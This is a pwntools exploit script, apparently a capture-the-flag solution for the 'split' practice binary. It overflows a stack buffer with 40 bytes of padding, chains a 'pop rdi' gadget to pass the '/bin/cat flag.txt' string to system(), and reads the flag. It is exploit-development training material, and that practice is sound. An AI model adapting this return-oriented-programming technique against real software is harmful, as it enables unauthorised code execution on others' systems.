from pwn import *

context.log_level = 'debug'
file = './split'
elf = context.binary = ELF(file)

#usefulFunction makes call to system at 0040074b
system_call = p64(0x0040074b)

# /bin/cat flag.txt -> 0x00601060. We attempt to use this argument instead of /bin/ls
argument_for_system = p64(0x00601060)

# rdi_gadet -> 0x00000000004007c3 : pop rdi ; ret
rdi_gadget = p64(0x00000000004007c3)

offset_to_ip = 40

payload = b'A' * offset_to_ip + rdi_gadget + argument_for_system + system_call

gdb_script ='''
'''
#p = gdb.debug(file, gdbscript=gdb_script)

p = process()
p.recvuntil(b'>')
p.sendline(payload)
p.recvuntil(b'!}\n') #receive until end of flag

